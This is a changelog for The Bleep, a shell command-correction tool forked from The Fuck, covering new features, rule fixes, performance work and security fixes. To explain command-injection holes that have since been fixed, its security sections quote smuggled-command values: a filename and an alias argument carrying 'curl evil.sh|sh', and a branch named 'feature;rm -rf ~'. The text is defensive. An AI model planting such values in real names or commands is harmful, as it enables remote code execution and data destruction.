# Changelog

## 4.0.3 — unreleased

### Added

- **A clone runs itself, with nothing installed.** The alias is shell code that
  calls The Bleep again, and it called it by the one name an installed copy has:
  `thebleep`, whatever that turns out to be on your `PATH`. A checkout had no
  way to say otherwise, so `python -m thebleep --alias` from a clone printed an
  alias pointing at the release you installed months ago -- you could work on
  4.0.3 all day and have 4.0.0 correcting your commands, with nothing anywhere
  to tell you. That is not a thing an installer should have to fix.

  Run it as the package and the alias names the interpreter and the checkout it
  came from, so the clone is the whole installation:

  ```bash
  eval "$(python3 ~/src/thebleep/thebleep/__main__.py --alias-loader)"
  ```

  One line in a startup file, works from any directory, no `PYTHONPATH`, and
  `git pull` is the upgrade. The interpreter named there needs `psutil` and
  `pyte`, which is the whole of the setup. `thebleep --alias` still says `thebleep`, so
  nothing about an installed copy changed. `THEBLEEP_COMMAND` overrides what
  goes into the alias, for a wrapper of your own or a shell whose quoting is not
  the quoting used here. `python -m thebleep` against a copy in `site-packages`
  keeps the ordinary answer -- there is no clone there to prefer.
- **`install.sh --dev`** installs a checkout *editable*, with whichever of `uv`,
  `pipx` or `pip` it finds, for when you would rather have `thebleep` on your
  `PATH` for real. Installing a checkout without it copies the files once, and
  the copy is stale by the next commit.

### Changed

- **`whomi` no longer suggests `which`.** The question the whole tool exists to
  answer -- what did you mean -- had no module and no test. It was three utility
  functions inherited unexamined from The Fuck, and underneath them
  `difflib.SequenceMatcher`, which measures how similar two sequences are and
  was being asked how someone mistypes. Those are not the same thing:

      difflib ratio    gti/git 0.667    gti/tic 0.667    gti/gtk 0.667

  A four-way tie, decided by whichever order `PATH` happened to be read in --
  which is how `gti status` came to suggest `tic status`, the terminfo compiler.
  `git` earned no credit for being one *swap* away, because a common-subsequence
  measure has no idea what a transposition is.

  There is now a `thebleep.matching` module that owns the question, built on
  Damerau-Levenshtein distance, where a transposition costs one edit. The same
  comparison becomes `git` 1, `tic` 2, and the tie is gone. Anything further away
  than roughly a quarter of the word is not offered at all, which is what stops
  `wgte` reaching `getent` and `ping` reaching `pinky` -- a confident wrong
  answer being worse than none.

  Two further faults in the same path:

  - **Your history was an override rather than a hint.** The nearest name from
    your shell history went first with no comparison against the best answer
    available. `whoami` is one edit from `whomi`; `which` is three, and won
    because it was in the history -- put there by somebody running `which bleep`
    while debugging this very tool. The idea is worth keeping, so it now breaks
    a tie: a name you have used wins when it is *as good* a match, never when it
    is worse.
  - **Shell builtins were not candidates at all.** Only `PATH` was searched, so
    `exti` could not reach `exit`, nor `cdd` reach `cd`, however obvious the
    slip.

  `pip nistall` is now decided by the same measure rather than by the margin
  between two `difflib` ratios, so the destructive-subcommand list and the tuning
  constant added earlier in this release are both gone: a transposition of
  `install` is one edit away and `uninstall` is two, in both directions.
- **`tests/corpus/`, and the reason it exists.** There were 3,713 tests and not
  one asked *"given this typo, is the first suggestion sane?"* Every rule was
  checked on its own against a hand-written fixture of its own tool's output,
  which cannot catch what a user meets -- the answer they see comes out of the
  shared matching helpers and the ordering across rules, and no rule owns
  either. That is how the suite stayed green while `whomi` suggested `which`.

  The corpus is ~80 real typos and the answer each should get first, with a real
  `PATH` listing and a fixed history so it gives one answer on every machine and
  on Windows. It runs with the suite, so a regression in suggestion quality now
  fails the build.

### Fixed

- **`git branch -d master` no longer deletes `main`.** One keypress, a branch
  nobody had named, gone. Two faults stacked. `git_branch_delete_checked_out`
  matched `error: Cannot delete branch 'x' checked out at`, which is what git
  2.45 and older printed; 2.46 renamed it to `cannot delete branch 'x' used by
  worktree at`, so on any current git the rule went dead. With it dead
  `git_main_master` answered the error instead -- and that rule fired on any git
  output containing `'master'` and rewrote the command by plain string
  substitution, so the suggestion was `git branch -d main`.

  Both are fixed: the first accepts either wording, and the second now requires
  git to have said the name is one it does *not* have (`did not match any
  file(s)`, `branch 'x' not found`, `not something we can merge`, `invalid
  upstream`). An error about a branch that exists is no longer a reason to
  rename it, and the substitution is by word rather than by substring, so
  `release/master-fix` is left alone.
- **`cp a.txt dir/a.txt` no longer makes a *directory* called `a.txt`.**
  `cp_create_destination` ran `mkdir -p` on the whole destination, filename
  included, so the copy landed inside a directory named after the file it should
  have been -- and the command exited 0, so nothing said otherwise. It also
  fired when the missing thing was the *source*, where there is nothing to make:
  `mv typoo.txt newname.txt` suggested `mkdir -p newname.txt && mv ...`, which
  failed and left the directory behind. It now reads which path the message
  names -- `cannot create` and `cannot move ... to` name the destination,
  `cannot stat` names the source -- and makes the directory holding it. GNU and
  busybox wordings both captured; busybox `mv` is left alone because it says the
  same thing whichever path is missing.
- **`pip nistall requests` no longer offers only `pip uninstall requests`.**
  pip names one candidate and that was taken on trust, so a transposed
  `install` was answered with the command that removes the package -- the only
  suggestion, with nothing to arrow down to, and only pip's own prompt in the
  way. Sorting by closeness does not help: `difflib` scores `nistall` nearer to
  `uninstall` (0.875) than to `install` (0.857). What it does show is that every
  genuine typo is decided by a tenth or more and only the ambiguous one is
  close, so a near tie is now enough to demote the reading that removes things.
  `pip unistall` still means `uninstall`. The other candidates come from pip
  itself, read out of the table pip dispatches on.
- **`npm` suggestions that could not run, and one that ran the wrong thing.**
  `npm urgrade` produced the literal suggestion `npm None` -- npm 7 and later
  print no command list, so there was nothing to match against and `None` was
  pasted into the command. `npm build` produced `npm run`, because only the
  first word of npm's own multi-word suggestion was read. And `npm run strat`
  produced `npm run watch`: the script list left out every lifecycle script, so
  `start` was never a candidate, and the 0.1 closeness floor accepted whatever
  remained. npm's suggestion and the project's scripts now go into one pool
  ordered by closeness, and the lifecycle scripts are in it.
- **`sudo make install` no longer suggests `sudo sudo make install`.** Rules are
  offered the command with its wrapper peeled off as well as whole, which is how
  `ls` behind a `sudo` gets `sudo ls -lah`. But the `sudo` rule itself was
  offered the peeled command too, answered `sudo make install`, and then had the
  peeled `sudo` put back in front. A rule named after the wrapper no longer runs
  on the command that wrapper came off.
- **Four more rules had gone dead against current git, and two of them
  crashed.** All four had green tests, because every fixture was written by hand
  from the wording of the day. They are now parametrised over what git 2.30.2,
  2.39.5 and 2.47.3 actually print, captured from each.
  - `git_branch_exists` wanted `fatal: A branch named 'x' already exists.` --
    capital, full stop. git 2.39 dropped both.
  - `git_two_dashes` wanted `` `--all` (with two dashes ?)``. Every git tested
    prints `(with two dashes)?`, with the question mark outside the bracket, so
    this had never matched any of them.
  - `git_help_aliased` read the alias by splitting the output on a backtick.
    git prints `'st' is aliased to 'status'` and has for years, so the split
    raised `IndexError` -- a traceback in the terminal of anybody who ran
    `git help <alias>`.
  - `git_bisect_usage` took the subcommand from a regex without checking it had
    matched, so a bare `git bisect` -- which is how you discover you forgot the
    subcommand -- raised `IndexError` instead of politely offering nothing.
- **A mistyped subcommand is no longer a question.** 4.0.0 stopped running your
  previous command a second time without asking, and skipped asking only when
  there was no such program or the program was one that only ever reads. `git`
  could be neither -- `git push` is not a read -- so the single most common
  correction there is, a mistyped git subcommand, wanted a keypress before it
  would even look: `git satus` was treated exactly like `git push`.

  It no longer is. A program that dispatches on a subcommand does nothing
  whatever until it has recognised one, so a subcommand it does not have fails
  at dispatch the second time exactly as it did the first -- the same certainty
  as a program the shell cannot find, one level down. Nothing about the
  judgement widened: git is asked for its own list of subcommands rather than
  being matched against one written down here, so a subcommand added to git
  later is not mistaken for a typo. A subcommand git does have is still asked
  about, `git status` as much as `git push`, since whether it writes depends on
  the flags; so is an alias, which git lists among its subcommands and which can
  stand for anything including `!deploy.sh`; and so is anything with git's own
  options before the subcommand, such as `git -C /tmp satus`. An old git, a git
  that will not answer, or an answer that is empty all ask, as before.

  `cargo` is in on the same terms, from `cargo --list`. `npm`, `docker`, `uv`,
  `apt-get`, `kubectl` and `yarn` are not, and the bar they failed is worth
  writing down: the list has to be *complete*, because a word missing from it
  looks like a typo and its command then runs again unasked. `npm uninstal` is
  in neither `npm help` nor `npm -l`, runs, and rewrites your `package.json`;
  `uv build-backend` is in neither of uv's listings; `docker` prints a plugin as
  `compose*`, so the word that dispatches is missing and `docker compose up -d`
  would have been taken for a typo; `apt-get` calls its own list "Most used
  commands"; and `yarn` resolves an unrecognised word against the scripts in
  whatever `package.json` you are standing next to, so no listing can ever
  cover it. A `--help` screen is a document for a person, not a promise about
  what the program will accept.

  git's list is asked for without `nohelpers`, which would have been tidier and
  was wrong: it subtracts the eight `--`-suffixed commands, all of which
  dispatch, so `git web--browse http://x` looked like a typo and relaunched a
  browser unasked.

### Rules

- `kubectl_unknown_command` — fixes a mistyped `kubectl` subcommand from the
  suggestions kubectl itself prints: `kubectl gat pods` becomes
  `kubectl get pods`. Sorted by how close each suggestion is to what was typed,
  because kubectl's own order offers `set` before `get` for `gat`.
  (by [@TrixSec](https://github.com/TrixSec) in
  [#1](https://github.com/stamparm/thebleep/pull/1))
- `uv_unknown_subcommand` — fixes a mistyped `uv` subcommand from the tip uv
  itself prints: `uv piip install requests` becomes
  `uv pip install requests`. Subcommands of a subcommand work the same way, so
  `uv pip instll`, `uv tool runn` and `uv python instal` are all corrected.
  (by [@TrixSec](https://github.com/TrixSec) in
  [#3](https://github.com/stamparm/thebleep/pull/3))

## 4.0.2 — 2026-08-19

Nothing about the tool itself changed. `pip install --upgrade` is worth it only
if the PyPI page bothered you.

- The build badge is no longer on the PyPI page. Its image is served live from
  the default branch, so every version's page read out whatever master happened
  to be doing that day -- a red master put "build failing" on the page of a
  release that was green when it was made. It stays on the README, where it tells
  a contributor something true.
- The test matrix no longer runs twice for every release. A tag push is a `push`
  event and the concurrency group is keyed on the ref, so the same commit was
  tested once when it landed on master and again when it was tagged.
- Some tests of `release.py`'s own printed output are gone. They asserted the
  shape of strings a developer script prints, which cost a CI cycle every time
  anybody touched it.

## 4.0.1 — 2026-08-19

### Security

- **A branch name could run a command.** Seven rules read a name out of the
  failed command's own output and put it into the suggestion without quoting it,
  and the suggestion goes to your shell to be evaluated once you accept it. Only
  whitespace, control characters and `~^:?*[\\` are illegal in a git ref name, so
  `;`, `$()`, a backtick, `&`, `|` and `#` are all available to whoever named the
  branch — and a name is not something you chose when you are reviewing somebody
  else's work or have just cloned a repository.

  `git_push`, `git_pull` and `git_push_different_branch_names` take the branch
  out of git's own hint. `git_merge` takes a branch name from the remote.
  `git_help_aliased` takes an alias out of the repository's `.git/config`.
  `fix_file` takes a filename off disk, which is the one that needs no git at
  all: unpacking an archive is enough to put `a;curl evil.sh|sh .py` where a
  compiler will name it back at you. `yarn_alias` and `rails_migrations_pending`
  repeat a command line out of their tool's output, which is the same shape with
  less reachable data behind it.

  All eight quote what they read now, and all eight are in
  `tests/test_injection.py`, which runs each suggestion through a real shell with
  seven metacharacter payloads and fails if anything executes. That also settles
  a crash of long standing: a branch called `swteam/#486/general_contact_info`
  produced a suggestion that broke zsh's `eval`
  ([nvbn/thefuck#782](https://github.com/nvbn/thefuck/issues/782), and
  [#600](https://github.com/nvbn/thefuck/issues/600) and
  [#762](https://github.com/nvbn/thefuck/issues/762) before it), because the
  upstream fix for that was `.replace("'", r"\\'")` and only ever covered the
  apostrophe.

  Reported by [@robkorv](https://github.com/robkorv) in
  [#2](https://github.com/stamparm/thebleep/issues/2), with a working proof of
  concept for three of them; the other four came out of the sweep that followed.

## 4.0.0 — 2026-08-19

The first release of *The Bleep*, and the first release of this codebase since
*The Fuck* 3.32 in January 2022. The version continues *The Fuck*'s numbering
rather than restarting it, because this is the same codebase carried forward.

### New

- **Press tab to edit a correction instead of running it.** A suggestion is
  often ninety-five percent right, and the last five percent used to mean
  retyping it. `tab` at the confirmation prompt hands it to your shell's line
  editor with the cursor at the end; nothing runs until you press return. Zsh,
  Fish and Nushell put it in the next prompt (`print -z`, `commandline
  --replace`, `commandline edit --replace`),
  bash reopens it in readline (`read -e -i`), PowerShell makes it the newest
  history entry for `↑`. No `TIOCSTI`, no synthesised keystrokes: where a shell
  has no supported way to do it, the offer is not made. `--edit` makes it the
  behaviour of return for one run and `edit = True` makes it permanent.
  (based on [#1063](https://github.com/nvbn/thefuck/pull/1063),
  [#1104](https://github.com/nvbn/thefuck/pull/1104))
- **`--shell` says which shell you are in**, for the places where working it
  out from the process tree gets it wrong: containers, IDE terminals, wrapper
  scripts, `distrobox`. An unknown name is an error listing the known ones
  rather than a silent fallback to the generic shell, and naming the shell
  skips the walk up the process tree instead of adding to it.
  ([#1538](https://github.com/nvbn/thefuck/pull/1538))
- **Nushell is supported.** Shell detection, the alias, quoting, command
  chaining and history — both the plain-text and the SQLite one — with a real
  Nushell driving a real terminal in the tests. A correction there goes into
  your command line for you to submit, because Nushell has no `eval` by design
  and `nu -c` would run a corrected `cd` in a process that then exits. Chaining
  is `try { a; b }`: `and`/`or` in Nushell are boolean operators, not command
  separators, which is what the old patch for this got wrong.
  Its configuration is looked for where Nushell looks for it:
  `XDG_CONFIG_HOME` first on every platform — which is the order Nushell reads
  them in — then `%APPDATA%` on Windows and `~/Library/Application Support` on
  macOS, and on macOS `~/.config` as well, since either may be the one in use.
  (based on [#1442](https://github.com/nvbn/thefuck/pull/1442),
  [#1441](https://github.com/nvbn/thefuck/issues/1441),
  [#1254](https://github.com/nvbn/thefuck/issues/1254))
- **`thebleep --doctor`** checks the dozen things a bug report usually turns out
  to be: the alias in a file this shell does not read, `thebleep` on `PATH`
  being an older copy in another environment, a settings file with a typo in it
  so every setting was dropped, a `~/.config/thefuck` nobody copied over, an
  unwritable cache, a shell that was guessed wrong. It is safe to paste — names
  of settings and never their values, nothing out of the environment but the
  handful of names The Bleep defines, home folded back to `~` — and it changes
  nothing on the way: no config directory created, no settings file written, no
  rule pack built.
- **A command behind a wrapper is corrected as though it were on its own.**
  `sudo -u www-data git chekout main`, `env FOO=bar npm sart`, `nice -n 10
  cargo buld`, `nohup ./deply.sh` — `sudo`, `doas`, `env`, `command`,
  `builtin`, `nice`, `nohup`, `setsid` and `stdbuf` are peeled off, nested and
  in any combination, every rule sees what is underneath, and the
  wrapper comes back in front of the suggestion exactly as it was typed. One
  model for all 173 rules, where before there was a `sudo`-only decorator that
  26 of them had asked for individually. It refuses rather than guesses: not
  for `sudo -i`, `sudo -s`, `sudo -e`, `sudo -l` or `command -v`, which do not
  run the command; not past an option it does not recognise, which might be one
  that takes a value; and not through shell syntax, where the first word is not
  the only command anyway.
  (based on [#1101](https://github.com/nvbn/thefuck/pull/1101))
- **`?` at the prompt says why a suggestion is being made**: which rule it came
  from, whether that rule is bundled, one of yours or from a package, what it
  matched, whether it needed your command's output, whether accepting it does
  anything besides run the command, and whether it runs as another user. Every
  line is a fact about the rule rather than a description of it — the app it
  declares and the text it requires in the output are read out of its own
  `match`, by the same extraction that decides which rules to load at all — so
  a rule of your own explains itself as well as a bundled one does, and not one
  of the 173 needed a hand-written description. `--explain` starts that way and
  `explain = True` makes it permanent.

### It runs on current Python

- `distutils` is gone, which is what stopped *The Fuck* from starting on Python
  3.12 at all, and `pkg_resources` and `imp` went with it.
  ([#1499](https://github.com/nvbn/thefuck/pull/1499),
  [#1610](https://github.com/nvbn/thefuck/pull/1610),
  [#1552](https://github.com/nvbn/thefuck/issues/1552))
- Python 2 support removed.
  ([#1479](https://github.com/nvbn/thefuck/pull/1479),
  [#873](https://github.com/nvbn/thefuck/pull/873))
- Tested on Python 3.9 through 3.14, on Linux, macOS and Windows.

### Security

- The `sudo` rule no longer hands a re-quoted script to `sh -c` as root, where
  quoted data could be re-read as code.
- Filenames, branch names and URLs that rules read out of a failed command's
  own output are quoted before being put back into a command.
  (both [#1606](https://github.com/nvbn/thefuck/issues/1606))
- `open_command` quotes the URL it passes to the shell.
  ([#1531](https://github.com/nvbn/thefuck/issues/1531))
- **Names that come from somewhere else are quoted.** A correction is text your
  shell then evaluates, and much of that text is copied out of a place you do
  not control. git accepts a branch called `feature;rm -rf ~`, npm accepts a
  script called the same, and a Gruntfile task name is any string at all. With a
  repository carrying such a branch, a mistyped `git checkout` offered
  `git checkout feature;rm -rf ~` as its first suggestion. Quoted now in the
  helper behind two dozen rules and in the six that build their own suggestions.
- **The command being run again no longer inherits your shell's state.** Reading
  what your last command printed means running it again, and the environment it
  was handed included everything the alias had just put there — `TB_HISTORY` is
  your last ten commands and `TB_SHELL_ALIASES` is your alias list. A mistyped
  program name that happened to exist got both.
- **`GIT_TRACE=1` is set for git and for nothing else.** It was in the default
  environment for every command that got run again.
- **The alias name is checked before it is written into shell code.**
  `thebleep --alias-loader 'x; curl evil.sh|sh; f' >> ~/.bashrc` used to write a
  line that ran that at every shell startup.

### Safety

- **Instant mode's recording of your terminal is no longer world-readable.** It
  is a megabyte of everything that has scrolled past — the contents of every
  file read, every token a command printed, every password typed at a prompt
  that echoes — and it was created in `/tmp` with no mode at all, which is 0666
  less your umask. It is 0600 now, in `$XDG_RUNTIME_DIR` where there is one,
  opened with `O_EXCL` and `O_NOFOLLOW` so that a name somebody else got to
  first is refused rather than opened and a symlink left in the way is not
  followed.
- **Instant mode cleans up after itself.** Closing the terminal left the
  recording on disk, along with the logger and the shell inside it, for the
  rest of the login session: the copy loop it used waits on for a shell nobody
  can type at any more. The logger now removes its own recording however it
  leaves, and the shell that started it has a `trap` as a backstop for the one
  signal nothing can catch. Two more while there: a chunk of output that
  overflowed the recording was dropped rather than kept after the room was
  made, and a shell that exited normally left the terminal in raw mode.
- **The previous command is no longer run again without asking.** Correcting a
  command means knowing what it printed, and a shell keeps no record, so the
  command was run a second time — before any correction had been offered or
  agreed to. It is now confirmed first, unless there is no such program to run
  or the program is one that only ever reads. `confirm_replay = False` restores
  the old behaviour.
  ([#1126](https://github.com/nvbn/thefuck/issues/1126))
- **What you agree to is what runs.** Seven rules did more than they said, and
  now do only what they say:
  - `dirty_untar` and `dirty_unzip` deleted every file named in the archive
    after you accepted extracting it into a directory of its own. They could not
    tell an extracted file from one of yours under the same name, so a README in
    the archive meant yours was overwritten and then deleted; and the check
    meant to keep them inside the current directory was a string prefix test, so
    an archive member called `../foobar/precious` walked out of it. They leave
    the files alone.
  - `ssh_known_hosts` returned your own command unchanged and deleted the
    offending `known_hosts` line behind it, so a man-in-the-middle warning
    disappeared with nothing to read. It now suggests the `ssh-keygen -R` that
    ssh itself prints, in front of your command, with the file and host quoted.
    On the DNS-spoofing warning it used to delete the entry that was *correct*
    as well.
  - `rm_dir` adds `-r`, not `-rf`.
  - `pip_install` no longer falls back to `sudo pip install`.
  - `python_module_error` is off by default: an import name is not a
    distribution name, so the package it offers to install is a guess, and a
    mistyped import makes it `pip install <typo>`.
  - `quotation_marks` only fires when your command genuinely does not parse.
- **The list of commands that only read is shorter.** `uniq` takes an output
  file as its second operand, `file -C` writes a compiled magic file,
  `info --output` writes the page out, `less` runs whatever `LESSOPEN` names,
  and `man` writes into the cat page cache. Those, and the other pagers, are off
  it.
- **Suggestions come out in the same order every time.** Deduplication went
  through a set, and a set of corrections iterates by the hash of a string,
  which Python randomises per process — so with several suggestions at the same
  priority, which one the down arrow gave you was different on every run.

### Speed

Measured against *The Fuck* 3.32 on the same machine and the same Python 3.11,
median of 30 runs; the harness and the recorded run are in `bench/`.

- Opening a shell: 210 ms → 28 ms with `eval "$(thebleep --alias)"`, and with
  `--alias-loader` to nothing worth timing — the alias is defined on first use,
  so shell startup runs no Python at all.
- Correcting a mistyped command: 246 ms → 56 ms.
- Correcting after a command printed a megabyte: 3251 ms → 117 ms. This one is
  a correctness fix as much as a speed one: output used to be read only after
  the command exited, which deadlocks once the output fills the pipe buffer, so
  anything printing more than about 64 KB produced nothing to correct from.
- Rules are compiled once into a cache, and a command is only dispatched to the
  rules that could match it — around a fifth of the 173, rather than all of them.
- A rule that looked for twenty-eight different messages lowercased the whole
  output once per message. It lowercases it once.
- A correction opens roughly half the Python modules it used to: `ast`,
  `pickle`, `socket`, `uuid`, `tempfile`, `shutil`, `subprocess`, `difflib` and
  `colorama` are loaded only where they are used, `pyte`, `psutil`, `argparse`
  and `pprint` not at all, and `which` and `ShellConfiguration` no longer pull in
  `shutil` and `collections` to do what they do. `tests/test_performance.py`
  names every module that has to stay out and holds the total to a budget. This
  is what decides the cost on Windows, where a module is a file the interpreter
  must find and open and a scanner reads first.
- `python -m thebleep` runs the same entry point as the `thebleep` command, for
  environments whose scripts directory is not on `PATH`.

### Rules

New in this release:

- `zypper_no_such_command` — openSUSE and SLE had no rules at all, while apt,
  dnf, yum, pacman and brew each had theirs. zypper says which word it did not
  understand and then does not say what it could have been, so the candidates
  come from `zypper --help`, which lists every command with its abbreviations:
  `zypper isntall vim` becomes `zypper install vim`, and `zypper dpu` becomes
  `zypper dup`. Read out of `--help` rather than written into the rule, because a
  list in a rule file is a snapshot of whichever zypper its author had. Off
  unless `zypper` is installed.
- `pip_externally_managed` — since PEP 668, Debian, Ubuntu, Fedora and Arch all
  refuse `pip install` into the system Python. This offers what the error
  message itself recommends: `pipx install` for a single application where pipx
  is installed, and `python3 -m venv .venv && .venv/bin/pip install ...` for
  anything else. It deliberately does **not** offer `--break-system-packages`,
  which is in the message and is one word and is the one outcome the error
  exists to prevent — nor `sudo pip install`, nor `--user`, which PEP 668 marks
  as externally managed too.
  ([#1553](https://github.com/nvbn/thefuck/pull/1553))
- `docker_daemon_not_running` — `sudo systemctl start docker` in front of your
  command when Docker's daemon is not listening. Both spellings of the message
  are matched, the one Docker used up to 24 and the one it uses from 25. Only
  where `systemctl` is on the machine to run: `service docker start` and
  `open -a Docker` are each right somewhere else, and a suggestion that starts
  nothing is worse than none.
  ([#1102](https://github.com/nvbn/thefuck/pull/1102))
- `ping_url` — `ping https://github.com/` becomes `ping github.com`. The host is
  taken out with `urlsplit`, so a URL carrying a user name, a password or a port
  comes out as the host and nothing else.
  ([#1243](https://github.com/nvbn/thefuck/pull/1243))

And fixed:

- `chmod_x` now works for a script run by any path and not only `./one`:
  `scripts/deploy.sh`, `~/scripts/deploy.sh` and
  `/home/alice/scripts/deploy.sh` are the same mistake with the same fix, and
  three of the four got no correction. A bare name with no separator in it is
  still left alone — that is a `PATH` lookup, where the file that could not run
  is somewhere else entirely.
  ([#1470](https://github.com/nvbn/thefuck/pull/1470))
- `paru` is recognised alongside `yay`, `pikaur` and `yaourt`, and preferred
  over them, both for suggesting a package to install and for correcting a
  package name. The list lives in one place now, so adding a helper adds it to
  both rules.
  ([#1514](https://github.com/nvbn/thefuck/pull/1514))
- `get_closest` returns nothing rather than raising `IndexError` when there are
  no possibilities to be close to. A rule that asks npm or lein for its list of
  subcommands and finds the tool is not installed gets an empty list, and
  `npm_wrong_command` died of it.
- **A suggestion identical to the command you typed is not offered.** A rule
  that matches on something in the output and then finds nothing in the script
  to change hands your own command back, which reads as a correction, takes a
  place in the list the arrow keys walk, and runs the same failure again when
  accepted. `docker ps -q --filter` and `git stauts` each came with one. A rule
  with a side effect still may, because there the command being unchanged is the
  point.
- `missing_space_before_subcommand` knows the shell's builtins. They are not on
  `PATH`, so it read `command`, `time` and `builtin` as words nobody could run
  and offered to break `command git status` into `comm and git status`.


Refreshed against what the tools print today, found by running them rather than
by reading their old fixtures: `npm` 7+, `cargo` 1.73+, `docker` 25+, `brew` 4,
`gem` 3.2+, `az`, `gradle` 8, `terraform` 1.x, and `git` for `main` rather than
`master`. ([#1320](https://github.com/nvbn/thefuck/issues/1320),
[#1341](https://github.com/nvbn/thefuck/issues/1341),
[#1313](https://github.com/nvbn/thefuck/issues/1313))

- New rule `git_dubious_ownership`, for git refusing a repository it thinks
  somebody else owns.
  ([#1376](https://github.com/nvbn/thefuck/issues/1376))
- `brew install` no longer offers to install something when a `brew uninstall`
  failed, which it did because `install` is a substring of `uninstall`.
- Environment assignments are looked past when identifying a command, so
  `FOO=bar git brnch` is corrected.
  ([#1172](https://github.com/nvbn/thefuck/issues/1172))

### Fixed

- Crash walking an unreadable process tree, and on a process that exits while
  being killed. ([#1600](https://github.com/nvbn/thefuck/pull/1600),
  [#1509](https://github.com/nvbn/thefuck/issues/1509),
  [#1026](https://github.com/nvbn/thefuck/issues/1026),
  [#1040](https://github.com/nvbn/thefuck/issues/1040))
- Works with no terminal attached, and exits quietly on a closed pipe.
  ([#1562](https://github.com/nvbn/thefuck/pull/1562),
  [#1539](https://github.com/nvbn/thefuck/pull/1539))
- Works under `bash`/`zsh` with `set -u`, and with an empty alias value.
  ([#1355](https://github.com/nvbn/thefuck/pull/1355),
  [#1551](https://github.com/nvbn/thefuck/pull/1551))
- Fish history is read from the XDG data directory.
  ([#1258](https://github.com/nvbn/thefuck/pull/1258))
- Commands on Windows are found when the file is not spelled as typed.
  ([#1209](https://github.com/nvbn/thefuck/issues/1209),
  [#1296](https://github.com/nvbn/thefuck/issues/1296))
- The environment is no longer printed into debug output.
  ([#995](https://github.com/nvbn/thefuck/pull/995))
- The selection can be abandoned with the escape key.
  ([#1506](https://github.com/nvbn/thefuck/pull/1506))
- A correction is not applied when nobody confirmed it, which is what happened
  in a pipe, a subprocess or CI. Pass `--yes` to apply without asking.
- **The alias no longer breaks because of something you pasted.** Your recent
  history was passed in an environment variable, and the kernel will not hand a
  program one larger than 128K, so one pasted command that size made the alias
  fail with "Argument list too long" until the entry fell out of the window.
  ([#798](https://github.com/nvbn/thefuck/issues/798))
- **PowerShell.** A chained correction ran only its first half: `(a) -and (b)`
  tests whether `a` *printed* something rather than whether it worked, so
  `git add . && git commit` skipped the commit. Arguments were quoted the POSIX
  way, which PowerShell splits into several. A correction beginning with `echo`
  was silently discarded, so correcting `ehco test` did nothing. `TB_SHELL` was
  left in the session environment and `TB_ALIAS` was never set. The correction
  loop now runs in real Windows PowerShell 5.1 and 7 in CI.
- **A rule that fails is that rule's problem.** One that matched and then raised
  while working out its suggestion took the whole correction down with a
  traceback, losing every other rule's suggestions. Five rules that raised on a
  bare `go`, `composer`, `touch` or `sudo` were fixed too, and a file in your
  rules directory that is not a rule no longer stops corrections entirely.
- **One setting that cannot be understood costs one setting.** A single
  unparseable environment variable silently discarded every other one, so an
  `exclude_rules` you had set quietly came back. Values are checked, too:
  `THEBLEEP_DEBUG=1` used to mean no.
- **Only commands you could actually run are suggested.** Every file in a
  directory on `PATH` counted, so a README was offered as a command and a
  non-executable `realthinh` came back ahead of the `realthing` beside it. On
  Windows, `PATHEXT` decides.
- **A damaged rule cache cannot change which corrections exist.** A corrupt
  entry used to make that rule disappear; it falls back to the rule's source.
- Bash's first-run advice named `~/.bashrc` even when you only have
  `~/.bash_profile`.

### Packaging

- One wheel, the same everywhere. `setup.py` chose its entry points and its
  scripts by looking at `sys.platform` while the package was being *built*,
  which decides nothing useful for a `py3-none-any` wheel: the artifact a Windows
  user would have installed carried the POSIX entry points and none of the
  Windows ones.
- `decorator` and `win_unicode_console` are no longer dependencies, and
  `colorama` is only a dependency on Windows.
- Publishing happens in CI, from a version tag, over PyPI trusted publishing:
  the artifacts are built once, installed and exercised on Linux, macOS and
  Windows, and those exact files are what gets uploaded. There is no API token.
- `snapcraft.yaml` is gone. It used a syntax snapcraft removed years ago, so it
  could not have built, and nothing published it.
- The `bleep.bat` and `bleep.ps1` scripts are gone with it. `cmd.exe` was never
  a supported shell, and a `bleep.exe` from the entry point takes precedence
  over a `.bat` anyway.

### Renamed from The Fuck

The command is `thebleep`, the alias it installs is `bleep`, settings live in
`$XDG_CONFIG_HOME/thebleep/`, and environment variables are `THEBLEEP_*`. See
[Coming from The Fuck](README.md#coming-from-the-fuck) — the settings file
copies over unchanged, and `thebleep --alias-loader fuck` keeps the word you
are used to.
